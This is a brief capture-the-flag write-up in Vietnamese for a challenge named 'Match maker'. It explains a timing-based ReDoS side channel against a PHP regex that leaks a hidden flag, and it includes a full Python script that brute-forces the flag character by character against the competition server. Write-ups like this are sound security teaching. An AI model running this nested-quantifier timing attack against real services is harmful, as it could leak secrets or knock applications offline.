# Match maker

Nhìn vào sẽ thấy input ra được đưa vào làm tham số hàm regex của php, cùng với đó là flag, vì flag không được in ra nên để biết được flag ta sẽ dựa vào thời gian thực thi của Regex để bruteforce (ReDos)

Solve Script:
```python
import requests 
from string import printable
import re 

# base_time = 0.01
FLAG = "midnight{"
url = "http://matchmaker-2.play.hfsc.tf:12345/?x=midnight{%s((((((((.*)*)*)*)*)*)*)*)!}"
guess = ""
for i in range(0, 100):
    for char in printable:
        if char in ".*?\\|":
            char = "\\" + char
        r = requests.get(url % (guess + char))
        time = re.findall("<strong>Exec Time:</strong> (.+)<br \/>", r.text)[0]
        print(time)
        if "E" not in time and float(time) >= 0.001:
            FLAG += char
            guess += char
            print("[+ ==>] Guessing: " + guess)
            if char == "}":
                print(FLAG)
            break
        print("[*] trying " + char)
```
